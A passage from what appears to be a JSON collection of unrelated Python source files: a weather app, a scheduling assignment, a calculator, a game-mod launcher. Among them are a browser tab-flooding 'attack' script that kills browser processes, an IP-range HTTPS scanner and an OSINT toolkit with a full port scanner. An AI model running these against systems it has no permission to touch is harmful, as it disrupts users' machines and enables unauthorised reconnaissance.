f\"https://api.openweathermap.org/data/2.5/weather?q={city}&appid={api_key}\" \r\n\r\n        try:\r\n            reponse = requests.get(url)\r\n            reponse.raise_for_status()\r\n            data = reponse.json()\r\n        \r\n            if data[\"cod\"] == 200:\r\n                self.display_weather(data)\r\n            \r\n        except requests.exceptions.HTTPError:\r\n            match reponse.status_code:\r\n                case 400:\r\n                 self.display_error(\"Bad Request:\\nPlease Check City Name\")\r\n                case 401:\r\n                 self.display_error(\"Unauthorised:\\nInvalid API Key\")\r\n                case 403:\r\n                 self.display_error(\"Access Denied:\\nForbidden\")\r\n                case 404:\r\n                 self.display_error(\"404 not found:\\nPlease Check City Name\")\r\n                case 500:\r\n                 self.display_error(\"Oops Internal Server Error:\\nPlease Try Again Later\")\r\n                case 502:\r\n                 self.display_error(\"Bad Gateway:\\nInvalid Response from Server\")\r\n                case 503:\r\n                 self.display_error(f\"Service Unavaiable:\\nCan't reach the server\")\r\n                case 504:\r\n                 self.disp",
    "# Membres du groupe\n# Josu\u00e9 Mongan (20290870)\n# Kuza Twagiramungu (20317467)\n# Date: 13-12-2024\n\n\nimport codeboot\n\n\n# Variables globales pour la maintenabilit\u00e9 du code.\n\ndebut_horaire = \"0800\"\nfin_horaire = \"1700\"\nduree_case = 30           # dur\u00e9e de la case en minutes\n\njours = [\"Lundi\", \"Mardi\", \"Mercredi\", \"Jeudi\", \"Vendredi\"]\n\nsigne_clic = \"\u21c5\"\n\npalette = [\"#0FF\", \"#CFA\", \"#CDF\", \"#EB8\", \"#FF0\", \"#69E\", \"#F0F\"]\ncouleur_actuel = 0\n\nrestant = []              # tableau contenant les couleurs de la palette non\n                          # utilis\u00e9es apr\u00e8s une importation\n\ncliquer = None            # variable gardant l'\u00e9tat de clic de l'utilisateur\n  \nevenements = []\n\n\n\n\n\n\n# La fonction operations_horaire prend deux param\u00e8tres: deux cha\u00eenes de\n# caract\u00e8re operande et operateur. Le param\u00e8tre operande pr\u00e9cise une heure sous\n# format militaire et le param\u00e8tre operateur pr\u00e9cise l'op\u00e9ration \u00e0 effectuer\n# (+ ou -). Cette fonction ajoute ou retire la dur\u00e9e d'une case \u00e0 l'heure\n# pass\u00e9e en param\u00e8tre et renvoie la r\u00e9ponse en format militaire.\n\ndef operations_horaire(operande, operateur):\n \n    heure = int(operande[:2])\n    minutes = int(operande[2:])\n \n    nb_minutes = heure * 60 + minutes     # nombre total de minutes\n \n    if(operateur == '+'):\n     \n        nv_minutes = nb_minutes + duree_case\n     \n    else:\n     \n        nv_minutes = nb_minutes - duree_case\n     \n        # Cas d'une soustraction ramenant \u00e0 avant 00h.\n     \n        if(nv_minutes < 0):\n            nv_minutes = 24 * 60 + nv_minutes\n \n    nv_heure = str((nv_minutes // 60) % 24)\n    nv_minutes = str(nv_minutes % 60)\n \n    # Reconstitution de la nouvelle heure.\n  \n    res = \"0\" * (len(nv_heure) == 1) + nv_heure\n    res += \"0\" * (len(nv_minutes) == 1) + nv_minutes\n \n    return res\n\n\n\n# La fonction table_heures ne prend aucun param\u00e8tre. Elle g\u00e9n\u00e8re un tableau qui\n# contient l'ensemble des heures de l'horaire en format militaire tout en\n# tenant compte de l'heure de d\u00e9but, l'heure de fin et la dur\u00e9e de la case.\n\ndef table_heures():\n \n    actuel = debut_horaire\n \n    resultat = [debut_horaire]\n \n    while (actuel < operations_horaire(fin_horaire, '-')):\n      \n        # G\u00e9n\u00e9rer l'heure suivante en ajoutant la dur\u00e9e de la case.\n      \n        actuel = operations_horaire(actuel, '+')\n        resultat.append(actuel)\n  \n    return resultat\n\n\n\n# La fonction matrice prend deux param\u00e8tres qui sont des entiers. Le premier\n# est le nombre de rang\u00e9es de la matrice et le deuxi\u00e8me le nombre de colonnes.\n# La fonction retourne une matrice correspondante avec la valeur None \u00e0 toutes\n# les positions.\n\ndef matrice(nb_ligne, nb_col):\n \n    resultat = []\n \n    for _ in range(nb_ligne):\n        resultat.append([None] * nb_col)\n \n    return resultat\n\n\n\n# La proc\u00e9dure dessiner_horaire ne prend aucun param\u00e8tre. Elle reproduit, sur\n# le HTML de la page, les informations que la matrice horaire contient.\n\ndef dessiner_horaire():\n  \n    tbody = \"\"            # HTML du body de la table\n  \n    for i in range(len(horaire)):\n      \n        # Formation du HTML de la ligne de la matrice.\n      \n        heure = heures[i]\n        tr = \"<td>\" + heure[:2] + \"h\" + heure[2:] + \"</td>\"\n      \n        for j in range(len(horaire[i])):\n          \n            info = horaire[i][j]\n          \n            # Formation de l'id et du gestionnaire d'\u00e9v\u00e9nement de la case.\n          \n            ID = \"case_\" + str(i) + \"_\" + str(j)\n            ev = \"clic(\" + str(i) + \",\" + str(j) + \")\"\n          \n            attributs = 'class=\"cell\" id=\"' + ID + '\" onclick=\"' + ev + '\"'\n          \n          \n            # Gestion de chaque \u00e9tat possible d'une case.\n          \n            if(not info):\n              \n                contenu = \"\"\n          \n            elif(info == signe_clic):\n              \n                contenu = \"<b>\" + signe_clic + \"</b>\"\n              \n            else:\n              \n                contenu = info.nom\n                attributs += 'style=\"background-color:' + info.couleur + '\"'\n              \n          \n            td = \"<td \" + attributs + \">\" + contenu + \"</td>\"\n            tr += td\n          \n          \n        tbody += \"<tr>\" + tr + \"</tr>\"\n  \n    # Ajout du HTML sur la page.\n  \n    table_body = document.querySelector(\".table-body\")\n    table_body.innerHTML = tbody\n\n\n\n# La fonction colonne prend en param\u00e8tre un entier. Elle renvoie la colonne de\n# la matrice horaire qui a pour index l'entier en question.\n\ndef colonne(j):\n  \n    resultat = []\n  \n    for i in range(len(horaire)):\n        resultat.append(horaire[i][j])\n      \n    return resultat\n\n\n\n# La proc\u00e9dure inserer_colonne prend deux param\u00e8tres. Le premier est un tableau\n# et le deuxi\u00e8me est un entier qui est l'index d'une colonne de la matrice\n# horaire. Dans la matrice horaire, cette proc\u00e9dure remplace les valeurs de la\n# colonne index\u00e9e par celles contenues dans le tableau.\n\ndef inserer_colonne(col, j):\n  \n    global horaire\n  \n    for i in range(len(col)):\n        horaire[i][j] = col[i]\n\n\n\n# La fonction index prend deux param",
    "import os\r\nfrom twilio.rest import Client\r\nimport smtplib\r\n\r\nMY_EMAIL = \"your_mail\"\r\nPASSWORD = \"your_password\"\r\n\r\naccount_sid = 'your_sid'\r\nauth_token = 'your_tpken_key'\r\n\r\nclass NotificationManager:\r\n\r\n    def __init__(self):\r\n        self.client = Client(os.environ['TWILIO_SID'], os.environ[\"TWILIO_AUTH_TOKEN\"])\r\n\r\n        def send_sms(self, message_body):\r\n\r\n            message = self.client.messages.create(\r\n            from_=os.environ[\"FROM_TWILIO_VIRTUAL_NUMBER\"],\r\n            body=message_body,\r\n            to=os.environ[\"TO_TWILIO_VIRTUAL_NUMBER\"]\r\n        )\r\n        print(message.sid)\r\n\r\n    \r\n    def send_mail(self, customer_data, email_body):\r\n        with smtplib.SMTP(\"smtp.gmail.com\") as connection:\r\n            connection.starttls()\r\n            connection.login(MY_EMAIL, PASSWORD)\r\n            for customer in customer_data:\r\n                connection.sendmail(\r\n                    from_addr=MY_EMAIL,\r\n                    to_addrs=customer,\r\n                    msg=f\"Subject:New Low Price Flight!\\n\\n{email_body}\".encode('utf-8')\r\n                )\r\n\r\n",
    "import threading\r\nimport webbrowser\r\nimport time\r\nimport tkinter as tk\r\nfrom tkinter import messagebox, simpledialog\r\nimport os\r\nimport signal\r\nimport psutil\r\n\r\n# Disclaimer: Only use this script on systems you own or have explicit permission to test.\r\n\"\"\"\r\n\u26a0\ufe0f DISCLAIMER \u26a0\ufe0f\r\nThis script is intended for educational and research purposes only.\r\nUse it ONLY in a controlled environment or on systems you own or\r\nhave explicit permission to test. Misuse of this script can result\r\nin legal consequences.\r\nBy using this script, you agree to act responsibly and ethically.\r\n\"\"\"\r\n\r\n# URL to open in tabs\r\nTARGET_URL = \"https://www.example.com\"  # Replace with your own URL or local environment\r\nOPEN_DELAY = 0.1  # Delay between opening tabs in seconds\r\nBREAK_INTERVAL = 30  # Break interval in seconds\r\nCODE_ENTRY_TIMEOUT = 30  # Time given to enter the code\r\nDEFENSE_CODE = \"leavemealone\"  # Defense code to stop the attack\r\n\r\n# Flag to stop the attack\r\ndefense_flag = threading.Event()\r\n\r\ndef open_tabs():\r\n    \"\"\"Open web browser tabs continuously with periodic breaks.\"\"\"\r\n    tab_count = 0\r\n    while not defense_flag.is_set():\r\n        # Open tabs continuously\r\n        start_time = time.time()\r\n        while time.time() - start_time < BREAK_INTERVAL:\r\n            if defense_flag.is_set():\r\n                print(\"Attack stopped by defense activation.\")\r\n                return\r\n            webbrowser.open(TARGET_URL)\r\n            tab_count += 1\r\n            print(f\"Tab {tab_count} opened.\")\r\n            time.sleep(OPEN_DELAY)\r\n\r\n        # Trigger the defense mechanism during the break\r\n        if not run_defense_mechanism():\r\n            print(\"Code not entered correctly. Resuming attack...\")\r\n\r\n\r\ndef run_defense_mechanism():\r\n    \"\"\"Show a popup window to accept the defense code with countdown.\"\"\"\r\n    root = tk.Tk()\r\n    root.withdraw()  # Hide the main tkinter window\r\n    root.attributes('-topmost', True)  # Make the dialog always on top\r\n\r\n    for remaining_time in range(CODE_ENTRY_TIMEOUT, 0, -1):\r\n        user_input = simpledialog.askstring(\r\n            \"Defense Code\",\r\n            f\"Enter the defense code to stop the attack (Time left: {remaining_time}s):\",\r\n            parent=root\r\n        )\r\n        if user_input and user_input.strip().lower() == DEFENSE_CODE:\r\n            defense_flag.set()\r\n            messagebox.showinfo(\"Success\", \"You are safe now! The attack has stopped.\")\r\n            close_browser_windows()\r\n            root.destroy()\r\n            return True\r\n        elif user_input:\r\n            messagebox.showerror(\"Error\", \"Incorrect code. Try again.\")\r\n        time.sleep(1)  # Countdown timer\r\n\r\n    root.destroy()\r\n    return False  # User failed to enter the correct code\r\n\r\ndef close_browser_windows():\r\n    \"\"\"Close all browser windows (specific to certain systems).\"\"\"\r\n    for process in psutil.process_iter(attrs=['pid', 'name']):\r\n        if 'chrome' in process.info['name'].lower() or 'firefox' in process.info['name'].lower():\r\n            os.kill(process.info['pid'], signal.SIGTERM)\r\n\r\n# Main function to start the attack and defense mechanism\r\ndef main():\r\n    global defense_flag\r\n\r\n    # Start the tab-opening attack\r\n    open_tabs()\r\n\r\n    print(\"Simulation ended.\")\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n",
    "import tkinter as tk\r\n\r\ndef on_button_click(value):\r\n    current = display.get()\r\n    display.delete(0,tk.END)\r\n    display.insert(0,current+value)\r\n    \r\ndef clear_display():\r\n    display.delete(0,tk.END)\r\n\r\ndef calculate():\r\n    try:\r\n        \r\n        result = eval(display.get())\r\n        display.delete(0, tk.END)\r\n        display.insert(0, str(result))\r\n    except:\r\n        display.delete(0, tk.END)\r\n        display.insert(0, \"Error\")\r\n        \r\n\r\n\r\nroot = tk.Tk()\r\nroot.title(\"calculator\")\r\nroot.geometry(\"400x400\")\r\nroot.config(bg=\"#2d2d2d\")\r\n\r\ndisplay = tk.Entry(root,font=(\"Arial\",20), borderwidth=1, relief=\"flat\",bg=\"#1e1e1e\",fg=\"white\")\r\ndisplay.grid(row=0,column=0,columnspan=4,padx=10,pady=10)\r\n\r\nbutton_style = {\r\n    'font':(\"Arial\",18),\r\n    'width':5,\r\n    'height':2,\r\n    'bd':0,\r\n    'relief':\"flat\",\r\n    'fg':\"white\",\r\n    'activebackground':\"#555\",\r\n    'bg':\"#333\"\r\n}\r\n\r\nbuttons = [\r\n    ('7', 1, 0), ('8', 1, 1), ('9', 1, 2), ('/', 1, 3),\r\n    ('4', 2, 0), ('5', 2, 1), ('6', 2, 2), ('*', 2, 3),\r\n    ('1', 3, 0), ('2', 3, 1), ('3', 3, 2), ('-', 3, 3),\r\n    ('0', 4, 0), ('C', 4, 1), ('=', 4, 2), ('+', 4, 3),\r\n]\r\n\r\n\r\nfor(text,row,col) in buttons:\r\n    if text == 'C':\r\n        command = clear_display\r\n        button_style['bg'] = \"#ff4d4d\"\r\n    elif text == '=':\r\n        command = calculate\r\n        button_style['bg'] = \"#4CAF50\"\r\n    else:\r\n        command = lambda t=text: on_button_click(t)\r\n        \r\n    button = tk.Button(root, text=text, command=command , **button_style)\r\n    button.grid(row=row ,column=col,padx=5,pady=5)\r\n    \r\nroot.mainloop()",
    "import threading\nimport ssl\nfrom IPy import IP\nimport chardet\n\n# parse arguments\nHTTP_proxy = None\nips=[]\nports=[443]\nnum_asyncio = 20\nnum_process = 5\nurl=\"https://www.baidu.com\"\ndestinations=[]\nmy_timeout = 5\nignore_cert = False\ncheck200 = None\ncheck30x = False\ncheck_content = None\n\nlogpath = \"\"\n\n\n\n# python main.py --proxy 127.0.0.1:2500 --ipr 10.0.0.0/24 --ipf ips.txt --ports 443 --portt 1445\n# parse arguments\n\nimport socket\n\nlogfile=None\n\nlock = threading.Lock()\n\n\ndef fprint(a,b,c):\n    lock.acquire()\n    try:\n        print(a+\":\"+str(b)+\"--------\"+str(c))\n        logfile.write(a+\":\"+str(b)+\"--------\"+str(c)+'\\r\\n')\n    finally:\n        lock.release()\n    \n\ndef fetch_with_ip(url,ip,port):\n    global HTTP_proxy\n    global my_timeout\n    try:\n        phost, pport = HTTP_proxy.split(':')\n        pport = int(pport)\n        host= url.split('//')[1].split('/')[0]\n\n\n        # \u521b\u5efaTCP\u8fde\u63a5\n        try:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        except Exception as e:\n            print(\"TCP Error\",e)\n        \n        sock.settimeout(my_timeout)\n\n        \n        if HTTP_proxy:\n            sock.connect((phost, pport))\n\n\n            # HTTP proxy CONNECT\n            request = f\"CONNECT {ip}:{port} HTTP/1.1\\r\\n\"+f\"Host: {host}\\r\\n\"+\"Proxy-Connection: Keep-Alive\\r\\n\"+\"User-Agent: Python-asyncio\\r\\n\"+\"\\r\\n\"        \n            # print(request)\n            sock.sendall(request.encode(encoding='utf-8'))\n            response = sock.recv(1024)\n            response = response.decode(encoding='utf-8')\n            # print(response)\n            if response.split()[1]!= '200':\n                print(\"Proxy CONNECT Error\",e)\n                raise(e)\n        else:\n            sock.connect((ip, port))\n\n        # wrap ssl\n        \n        ssl_context = ssl.create_default_context()\n\n\n        if ignore_cert:\n            ssl_context.check_hostname = False\n            ssl_context.verify_mode = ssl.CERT_NONE\n\n        ssl_sock = ssl_context.wrap_socket(sock, server_hostname=host)\n\n        # send request\n        if(len(url.split('//')[1].split('/',1)) == 1):\n            url=\"/\"\n        else:\n            url=\"/\"+url.split('//')[1].split('/',1)[1]\n        # print(url)\n        request = f\"GET {url} HTTP/1.1\\r\\n\"+\"Host: \"+host+\"\\r\\n\"+\"Connection: close\\r\\n\"+\"User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.140\\r\\n\"+\"\\r\\n\"\n        # print(request)\n        ssl_sock.sendall(request.encode(encoding='utf-8'))\n        \n        # receive response\n        response = b''\n        while True:\n            data = ssl_sock.recv(16384)\n            if not data:\n                break\n            response = response + data\n        response = response.decode(encoding='utf-8',errors='replace')\n        response_code = response.split('\\r\\n')[0].split()[1]\n        # response code\n        fprint(ip,port,response_code)\n        if (check200 and response_code == '200') or (check30x and response_code.startswith('3')):\n            try: \n                import os\n                os.makedirs(logpath+response_code+\"/\", exist_ok=True)\n                if ip.find(':')!=-1:\n                    ip=ip.replace(':','.')\n                print(\"check not implemented, write to \"+logpath+response_code+\"/\"+ip+\"_\"+str(port)+\".rsp\")\n                with open(logpath+response_code+\"/\"+ip+\"_\"+str(port)+\".rsp\", 'w+', encoding='utf-8', errors='replace') as f:\n                    f.write(response)\n            except Exception as e:\n                print(\"output error\",e)\n\n        \n        \n    except Exception as e:\n        if e==socket.timeout:\n            fprint(ip,port,\"Timeout\")\n        elif e==ssl.SSLError:\n            fprint(ip,port,\"SSL Error\")\n        elif e==socket.error:\n            fprint(ip,port,\"Socket Error\")\n        else:\n            fprint(ip,port,e)\n    \n\n\n\n# \u8fd0\u884c\u4e3b\u51fd\u6570\ndef do_fetch(url,destinations):\n    print(destinations)\n    threads = []\n    for ip,port in destinations:\n        thread_up = threading.Thread(target = fetch_with_ip , args =(url,ip,port) )\n        threads.append(thread_up)\n        thread_up.daemon = True   #avoid memory leak by telling os its belong to main program , its not a separate program , so gc collect it when thread finish\n        thread_up.start()\n    \n    for thread in threads:\n        thread.join()\n\n\ndef scan_ips():\n    global url\n    global destinations\n    global num_asyncio\n    global num_process\n    global my_timeout\n    import multiprocessing\n    \n    # _do_fetch(url,destinations)\n    for i in range(0,len(destinations),num_asyncio):\n        do_fetch(url,destinations[i:min(i+num_asyncio,len(destinations))])\n\n    # with multiprocessing.Pool(num_process) as pool:\n    #     for i in range(0,len(destinations),num_asyncio):\n    #         pool.apply_async(_do_fetch, args=(url,destinations[i:min(i+num_asyncio,len(destinations))]))\n    #     pool.close()\n    #     pool.join()\n\n    \n\n\ndef main():\n    global HTTP_proxy\n    global ips\n    global p",
    "def phone(number):\n    import phonenumbers\n    from phonenumbers import geocoder, carrier, timezone\n    try:\n        phones = phonenumbers.parse(number)\n        if phonenumbers.is_valid_number(phones):\n            print(f\"Phone Number: {number}\")\n            print(f\"Country: {geocoder.description_for_number(phones, 'en')}\")\n            print(f\"Carrier: {carrier.name_for_number(phones, 'en')}\")\n            print(f\"Time Zones: {timezone.time_zones_for_number(phones)}\")\n            print(f\"International Format: {phonenumbers.format_number(phones, phonenumbers.PhoneNumberFormat.INTERNATIONAL)}\")\n        else:\n            print(f\"The number {number} is not valid.\")\n    except phonenumbers.phonenumberutil.NumberParseException as e:\n        print(f\"Error parsing the number: {e}\")\ndef ipscan(ip, fast=False):\n    import requests\n    import socket\n    from concurrent.futures import ThreadPoolExecutor\n\n    def resolveip(domain):\n        try:\n            socket.inet_aton(domain)\n            return domain\n        except socket.error:\n            return socket.gethostbyname(domain)\n\n    def portscan(ipaddress, port):\n        try:\n            with socket.create_connection((ipaddress, port), timeout=1):\n                return True\n        except (socket.timeout, socket.error):\n            return False\n\n    def scanports(ipaddress):\n        ports = range(1, 65536)\n        with ThreadPoolExecutor(max_workers=100) as executor:\n            results = executor.map(lambda port: portscan(ipaddress, port), ports)\n        openports = [port for port, is_open in zip(ports, results) if is_open]\n        if openports:\n            print(f\"Open ports on {ipaddress}: {openports}\")\n        else:\n            print(f\"No open ports found for {ipaddress}.\")\n\n    ipaddress = resolveip(ip)\n    url = f\"https://ipinfo.io/{ipaddress}/json\"\n    try:\n        response = requests.get(url)\n        data = response.json()\n        print(f\"\\nIP Information for {ipaddress}:\")\n        print(f\"IP: {data.get('ip', 'N/A')}\")\n        print(f\"Location: {data.get('postal', 'N/A')}, {data.get('city', 'N/A')}, {data.get('region', 'N/A')}, {data.get('country', 'N/A')}\")\n        print(f\"Organization/ISP: {data.get('org', 'N/A')}\")\n        print(f\"Geolocation: {data.get('loc', 'N/A')}\")\n        print(f\"Hostname: {data.get('hostname', 'N/A')}\")\n        print(f\"Timezone: {data.get('timezone', 'N/A')}\")\n        if not fast:\n            scanports(ipaddress)\n    except requests.exceptions.RequestException as e:\n        print(f\"\\nError with the request: {e}\")\n    except socket.gaierror:\n        print(f\"\\nUnable to resolve domain or IP: {ip}\")\ndef creditcard(card):\n    import requests\n\n    def luhn(cardnumber):\n        total = 0\n        reverse = cardnumber[::-1]\n        for i, digit in enumerate(reverse):\n            n = int(digit)\n            if i % 2 == 1:\n                n *= 2\n                if n > 9:\n                    n -= 9\n            total += n\n        return total % 10 == 0\n\n    if not luhn(card):\n        print(f\"\\nInvalid card number: {card} (Luhn check failed).\")\n        return\n    bin = card[:6]\n    url = f\"https://lookup.binlist.net/{bin}\"\n    headers = {\"Accept\": \"application/json\"}\n    try:\n        response = requests.get(url, headers=headers)\n        data = response.json()\n        print(f\"\\nCredit Card: {card}\")\n        print(f\"Type: {data.get('scheme', 'N/A')}\")\n        print(f\"Brand: {data.get('brand', 'N/A')}\")\n        print(f\"Card Type: {data.get('type', 'N/A')}\")\n        print(f\"Card Issuer: {data.get('bank', {}).get('name', 'N/A')}\")\n        print(f\"Country: {data.get('country', {}).get('name', 'N/A')}\")\n        print(f\"Currency: {data.get('country', {}).get('currency', 'N/A')}\")\n        print(f\"Card Issuer Website: {data.get('bank', {}).get('url', 'N/A')}\")\n    except requests.exceptions.RequestException as e:\n        print(f\"\\nError making request: {e}\")\ndef email(email):\n    import re\n    import dns.resolver\n\n    def validemailformat(email):\n        pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$'\n        return bool(re.match(pattern, email))\n\n    if not validemailformat(email):\n        print(f\"Invalid email format: {email}\")\n        return\n    domain = email.split('@')[1]\n    try:\n        dns.resolver.resolve(domain, 'MX')\n        print(f\"\\nEmail Information for {email}:\")\n        print(f\"Domain: {domain}\")\n        print(f\"Mail Server Found: Yes (MX records found)\")\n        print(f\"Validity: Valid domain with mail server\")\n    except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):\n        print(f\"\\nCould not retrieve information for email {email}.\")\n        print(f\"Domain: {domain} does not have a valid mail server (MX record missing).\")\ndef vinscan(vin):\n    import requests\n    url = f\"https://vpic.nhtsa.dot.gov/api/vehicles/DecodeVin/{vin}?format=json\"\n    try:\n        response = requests.get(url)\n        if response.status_code == 200:\n            data = response.json()\n            print(f\"\\nFull response for VIN {vin}:\\n\")\n         ",
    "import os\nimport shutil\nfrom tkinter.filedialog import askdirectory\nfrom configparser import ConfigParser\nimport subprocess\nimport time\nimport ctypes\nfrom typing import TypedDict\nimport sys\nimport logging\n\nlog_file = \"launcher.log\"\nlogging.basicConfig(\n    filename=log_file,\n    level=logging.DEBUG,\n    format=\"%(asctime)s - %(levelname)s - %(message)s\",\n)\n\n\ndef ensure_pip():\n    try:\n        __import__(\"pip\")\n    except ImportError:\n        print(\"Pip not found, installing...\")\n        subprocess.check_call([sys.executable, \"-m\", \"ensurepip\", \"--default-pip\"])\n\n\ndef install_packages():\n    ensure_pip()\n    required_packages = [\"psutil\", \"requests\"]\n    for package in required_packages:\n        try:\n            __import__(package)\n        except ImportError:\n            subprocess.check_call([sys.executable, \"-m\", \"pip\", \"install\", package])\n\n\ninstall_packages()\n\nimport psutil\n\nconfig = ConfigParser()\n\nfilter_file_deleted = [\n    \"libraries.txt\",\n    \"winhttp.dll\",\n]\nww_os_pak = \"ww-patch-os.dll\"\nww_cn_pak = \"ww-patch-cn.dll\"\n\n\ndef hide_console():\n    # Get the current console window\n    hwnd = ctypes.windll.kernel32.GetConsoleWindow()\n    if hwnd:\n        # Hide the console window\n        ctypes.windll.user32.ShowWindow(hwnd, 0)\n\n\ndef clear_console():\n    \"\"\"Clear the console based on the operating system.\"\"\"\n    os.system(\"cls\" if os.name == \"nt\" else \"clear\")\n\n\ndef show_console():\n    # Get the current console window\n    hwnd = ctypes.windll.kernel32.GetConsoleWindow()\n    if hwnd:\n        # Show the console window\n        ctypes.windll.user32.ShowWindow(hwnd, 5)  # 5 = SW_SHOW\n\n\ndef is_process_running(process_name: str) -> bool:\n    \"\"\"Check if a process with the given name is running.\"\"\"\n    for process in psutil.process_iter([\"name\"]):\n        if process.info[\"name\"] == process_name:\n            return True\n    return False\n\n\ndef checkConfigExists():\n    return os.path.exists(\"config.ini\")\n\n\ndef createDefaultConfig():\n    if not checkConfigExists():\n        config.add_section(\"CONFIG\")\n        config.set(\"CONFIG\", \"game_paks_directory\", \"\")\n        config.set(\"CONFIG\", \"game_executable_path\", \"\")\n        config.set(\"CONFIG\", \"binaries_dir\", \"\")\n        config.set(\"CONFIG\", \"game_dir\", \"\")\n        config.set(\"CONFIG\", \"loader_dir\", \"./pak/loader/~mods\")\n        config.set(\"CONFIG\", \"bypass_sig_dir\", \"./pak/bypass\")\n        config.set(\"CONFIG\", \"debug_dir\", \"./pak/debug\")\n        config.set(\"CONFIG\", \"mod_directory\", \"./pak/Mod\")\n        config.set(\"CONFIG\", \"debug_mode\", \"false\")\n        config.set(\"CONFIG\", \"version\", \"\")\n\n        with open(\"config.ini\", \"w\") as configFile:\n            config.write(configFile)\n        print(\"config.ini created with default settings.\")\n\n\ndef saveGameDirectory():\n    path = askdirectory(title=\"Select Wuthering Wave Folder\")\n    if path:\n        config.read(\"config.ini\")\n        if not config.has_section(\"CONFIG\"):\n            config.add_section(\"CONFIG\")\n        # Set game directory\n        gamePaksPath = os.path.join(\n            path, \"Wuthering Waves Game\", \"Client\", \"Content\", \"Paks\"\n        )\n        gameExecutablePath = os.path.join(\n            path,\n            \"Wuthering Waves Game\",\n            \"Client\",\n            \"Binaries\",\n            \"Win64\",\n        )\n        binaries_path = os.path.join(\n            path, \"Wuthering Waves Game\", \"Client\", \"Binaries\", \"Win64\"\n        )\n        game_dir = os.path.join(\n            path,\n            \"Wuthering Waves Game\",\n        )\n        config.set(\"CONFIG\", \"game_executable_path\", gameExecutablePath)\n        config.set(\"CONFIG\", \"game_paks_directory\", gamePaksPath)\n        config.set(\"CONFIG\", \"binaries_dir\", binaries_path)\n        config.set(\"CONFIG\", \"game_dir\", game_dir)\n        # Save config file\n        with open(\"config.ini\", \"w\") as configFile:\n            config.write(configFile)\n\n\ndef checkAndSaveConfig():\n    createDefaultConfig()\n    config.read(\"config.ini\")\n\n    if not config.has_section(\"CONFIG\"):\n        print(\"CONFIG section is missing, creating default config.\")\n        createDefaultConfig()\n\n    if not config.has_option(\"CONFIG\", \"game_paks_directory\"):\n        print(\"Wuthering Waves not found, please select a directory.\")\n        saveGameDirectory()\n\n    if not config.has_option(\"CONFIG\", \"version\"):\n        setGameVersion()\n\n    game_folder = config.get(\"CONFIG\", \"game_paks_directory\").strip('\"')\n\n    if not game_folder:\n        print(\"please select a Wuthering Wave directory.\")\n        saveGameDirectory()\n\n\nclass loadTyped(TypedDict):\n    game_paks_directory: str\n    mod_directory: str\n    game_executable_path: str\n    bypass_sig_dir: str\n    loader_dir: str\n    binaries_dir: str\n    game_dir: str\n    debug_dir: str\n    debug_mode: str\n    version: str\n\n\ndef loadConfig() -> loadTyped:\n    config.read(\"config.ini\")\n    try:\n        game_paks_directory = config.get(\"CONFIG\", \"game_paks_directory\").strip('\"')\n        mod_directory = config.get(\"CONFIG\", \"mod_directory\").strip('\"')\n        game_execut",
    "# $Id: urischemes.py 8376 2019-08-27 19:49:29Z milde $\n# Author: David Goodger <goodger@python.org>\n# Copyright: This module has been placed in the public domain.\n\n\"\"\"\n`schemes` is a dictionary with lowercase URI addressing schemes as\nkeys and descriptions as values. It was compiled from the index at\nhttp://www.iana.org/assignments/uri-schemes (revised 2005-11-28)\nand an older list at http://www.w3.org/Addressing/schemes.html.\n\"\"\"\n\n# Many values are blank and should be filled in with useful descriptions.\n\nschemes = {\n      'about': 'provides information on Navigator',\n      'acap': 'Application Configuration Access Protocol; RFC 2244',\n      'addbook': \"To add vCard entries to Communicator's Address Book\",\n      'afp': 'Apple Filing Protocol',\n      'afs': 'Andrew File System global file names',\n      'aim': 'AOL Instant Messenger',\n      'callto': 'for NetMeeting links',\n      'castanet': 'Castanet Tuner URLs for Netcaster',\n      'chttp': 'cached HTTP supported by RealPlayer',\n      'cid': 'content identifier; RFC 2392',\n      'crid': 'TV-Anytime Content Reference Identifier; RFC 4078',\n      'data': ('allows inclusion of small data items as \"immediate\" data; '\n               'RFC 2397'),\n      'dav': 'Distributed Authoring and Versioning Protocol; RFC 2518',\n      'dict': 'dictionary service protocol; RFC 2229',\n      'dns': 'Domain Name System resources',\n      'eid': ('External ID; non-URL data; general escape mechanism to allow '\n              'access to information for applications that are too '\n              'specialized to justify their own schemes'),\n      'fax': ('a connection to a terminal that can handle telefaxes '\n              '(facsimiles); RFC 2806'),\n      'feed': 'NetNewsWire feed',\n      'file': 'Host-specific file names; RFC 1738',\n      'finger': '',\n      'freenet': '',\n      'ftp': 'File Transfer Protocol; RFC 1738',\n      'go': 'go; RFC 3368',\n      'gopher': 'The Gopher Protocol',\n      'gsm-sms': ('Global System for Mobile Communications Short Message '\n                  'Service'),\n      'h323': ('video (audiovisual) communication on local area networks; '\n               'RFC 3508'),\n      'h324': ('video and audio communications over low bitrate connections '\n               'such as POTS modem connections'),\n      'hdl': 'CNRI handle system',\n      'hnews': 'an HTTP-tunneling variant of the NNTP news protocol',\n      'http': 'Hypertext Transfer Protocol; RFC 2616',\n      'https': 'HTTP over SSL; RFC 2818',\n      'hydra': 'SubEthaEdit URI.  See http://www.codingmonkeys.de/subethaedit.',\n      'iioploc': 'Internet Inter-ORB Protocol Location?',\n      'ilu': 'Inter-Language Unification',\n      'im': 'Instant Messaging; RFC 3860',\n      'imap': 'Internet Message Access Protocol; RFC 2192',\n      'info': 'Information Assets with Identifiers in Public Namespaces',\n      'ior': 'CORBA interoperable object reference',\n      'ipp': 'Internet Printing Protocol; RFC 3510',\n      'irc': 'Internet Relay Chat',\n      'iris.beep': 'iris.beep; RFC 3983',\n      'iseek': 'See www.ambrosiasw.com;  a little util for OS X.',\n      'jar': 'Java archive',\n      'javascript': ('JavaScript code; evaluates the expression after the '\n                     'colon'),\n      'jdbc': 'JDBC connection URI.',\n      'ldap': 'Lightweight Directory Access Protocol',\n      'lifn': '',\n      'livescript': '',\n      'lrq': '',\n      'mailbox': 'Mail folder access',\n      'mailserver': 'Access to data available from mail servers',\n      'mailto': 'Electronic mail address; RFC 2368',\n      'md5': '',\n      'mid': 'message identifier; RFC 2392',\n      'mocha': '',\n      'modem': ('a connection to a terminal that can handle incoming data '\n                'calls; RFC 2806'),\n      'mtqp': 'Message Tracking Query Protocol; RFC 3887',\n      'mupdate': 'Mailbox Update (MUPDATE) Protocol; RFC 3656',\n      'news': 'USENET news; RFC 